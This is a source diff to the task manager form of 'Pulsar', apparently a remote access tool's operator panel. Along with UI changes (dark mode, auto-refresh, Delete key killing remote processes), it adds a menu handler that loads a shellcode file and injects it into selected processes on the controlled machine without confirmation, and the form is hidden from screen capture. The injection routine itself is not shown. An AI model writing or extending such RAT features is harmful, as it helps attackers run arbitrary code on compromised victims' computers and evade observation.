@@ -1,4 +1,5 @@
-﻿using Pulsar.Common.Enums;
+﻿using DarkModeForms;
+using Pulsar.Common.Enums;
 using Pulsar.Common.Messages;
 using Pulsar.Common.Messages.Administration.TaskManager;
 using Pulsar.Common.Models;
@@ -10,6 +11,7 @@ using Pulsar.Server.Messages;
 using Pulsar.Server.Networking;
 using System;
 using System.Collections.Generic;
+using System.IO;
 using System.Linq;
 using System.Threading.Tasks;
 using System.Windows.Forms;
@@ -56,7 +58,15 @@ namespace Pulsar.Server.Forms
             _processTreeView = new ProcessTreeView();
 
             InitializeComponent();
-            DarkModeManager.ApplyDarkMode(this);
+
+            // --- FORCE DARK MODE FOR THIS FORM ONLY ---
+            var _ = new DarkModeCS(this)
+            {
+                ColorMode = DarkModeCS.DisplayMode.DarkMode,
+                ColorizeIcons = false
+            };
+            // --- END DARK MODE FORCE ---
+
             ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
 
             _processTreeView.SortRequested += ProcessTreeView_SortRequested;
@@ -67,6 +77,11 @@ namespace Pulsar.Server.Forms
 
             _countdownTimer = new System.Windows.Forms.Timer { Interval = 1000 };
             _countdownTimer.Tick += CountdownTimer_Tick;
+
+            _pauseAutoRefresh = false;
+            enableDisableAutoRefreshToolStripMenuItem.Checked = true;
+            toolStripStatusLabel1.Text = $"Refreshing in {_countdownValue}s...";
+            toolStripStatusLabel1.ForeColor = _originalLabelColor;
             _countdownTimer.Start();
 
             RegisterMessageHandler();
@@ -439,8 +454,17 @@ namespace Pulsar.Server.Forms
                 ShowSearchDialog();
                 return true;
             }
+
+            // Handle Delete key to kill selected process
+            if (keyData == Keys.Delete)
+            {
+                PerformOnSelectedProcesses(p => _taskManagerHandler.EndProcess(p.Id));
+                return true; // indicate we've handled the key
+            }
+
             return base.ProcessCmdKey(ref msg, keyData);
         }
+
 
         private void ShowSearchDialog()
         {
@@ -509,6 +533,53 @@ namespace Pulsar.Server.Forms
             SetSuspendStateForSelectedProcesses(false);
         }
 
+        private void injectShellcodeToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            var selectedProcesses = GetSelectedProcesses().ToList();
+
+            if (!selectedProcesses.Any())
+            {
+                MessageBox.Show("Please select at least one process to inject shellcode into.", "No Process Selected",
+                    MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                return;
+            }
+
+            // Show file dialog to select shellcode file
+            using (var openFileDialog = new OpenFileDialog())
+            {
+                openFileDialog.Title = "Select Shellcode File";
+                openFileDialog.Filter = "Binary Files (*.bin)|*.bin|All Files (*.*)|*.*";
+                openFileDialog.FilterIndex = 1; // Auto-select .bin files
+
+                if (openFileDialog.ShowDialog() == DialogResult.OK)
+                {
+                    try
+                    {
+                        byte[] shellcode = File.ReadAllBytes(openFileDialog.FileName);
+
+                        if (shellcode.Length == 0)
+                        {
+                            MessageBox.Show("The selected file is empty.", "Empty File",
+                                MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                            return;
+                        }
+
+                        // Inject without confirmation
+                        PerformOnSelectedProcesses(p =>
+                        {
+                            _taskManagerHandler.InjectShellcode(p.Id, shellcode);
+                        });
+
+                        processesToolStripStatusLabel.Text = $"Shellcode injected into {selectedProcesses.Count} process(es)";
+                    }
+                    catch (Exception ex)
+                    {
+                        MessageBox.Show($"Error reading shellcode file: {ex.Message}", "File Read Error",
+                            MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    }
+                }
+            }
+        }
     }
 
     public class ProcessDataResult
